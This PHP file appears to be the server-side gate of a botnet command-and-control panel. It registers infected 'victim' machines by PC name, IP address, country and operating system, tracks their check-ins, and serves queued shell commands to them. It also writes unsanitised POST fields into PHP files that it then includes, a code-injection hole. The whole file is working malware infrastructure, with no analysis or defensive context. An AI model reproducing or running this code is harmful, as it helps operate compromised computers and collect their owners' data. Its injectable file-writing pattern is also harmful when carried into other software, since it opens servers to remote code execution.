<?php
function write_response($status,$message) {
    return "{'status': '$status', 'message': '$message'}";
}
if (isset($_POST['refresh'])) {
    $vic = md5($_SERVER['REMOTE_ADDR']);
    if (file_exists("../vc/$vic.php")) {
        include("../vc/$vic.php");
        $date1 = date('ymdhis');
        $file = fopen("../vc/$vic.php", 'w') or die(write_response('fail', 'problem with request'));
        $data = '<?php
$pc_name = "'.$pc_name.'";
$ip_address = "'.$ip_address.'";
$md5_address = "'.md5($ip_address).'";
$country = "'.$country.'";
$op_system = "'.$op_system.'";
$date1 = "'.$date1.'"
?>';
        fwrite($file, $data);
        fclose($file);
        echo write_response('success', 'refresh has been successfully');
    }
}
if (isset($_POST['online'])) {
    include('blacklist.php');
    $pc_name = $_POST['pcname'];
    $ip_address = $_SERVER['REMOTE_ADDR'];
    if (strpos($blacklist, $ip_address.'-') !== 0) {
        $content = json_decode(file_get_contents("http://freegeoip.net/json/$ip_address"));
        $country = $content->country_name;
        if (trim($country) == '') { $country = 'not found'; }
        $op_system = $_POST['opsystem'];
        if (!file_exists('../vc/'.md5($ip_address).'.php')) {
            $date1 = date('ymdhis');
            $vic_file = fopen('../vc/'.md5($ip_address).'.php', 'w') or die(write_response('fail', 'problem with request'));
            $data = '<?php
$pc_name = "'.$pc_name.'";
$ip_address = "'.$ip_address.'";
$md5_address = "'.md5($ip_address).'";
$country = "'.$country.'";
$op_system = "'.$op_system.'";
$date1 = "'.$date1.'"
?>';
            fwrite($vic_file, $data);
            fclose($vic_file);
            echo write_response('success', 'data writed successfully');
        } else { echo write_response('fail', 'victim already exists'); }
    } else { echo write_response('fail', 'dode, youre in blacklist :('); }
}
if (isset($_POST['check'])) {
    $ip_address = $_SERVER['REMOTE_ADDR'];
    if (file_exists('../vc/'.md5($ip_address).'.php')) { echo write_response('success', 'your still there'); } else { echo write_response('fail', 'nope :('); }
}
if (isset($_POST['get_commandline'])) {
    $ip_address = md5($_SERVER['REMOTE_ADDR']);
    if (file_exists('../cm/'.$ip_address.'.php')) {
        require('../cm/'.$ip_address.'.php');
        echo write_response('success', $command_line);
        unlink('../cm/'.$ip_address.'.php');
    } else { echo write_response('fail', 'no command available for you'); }
}
?>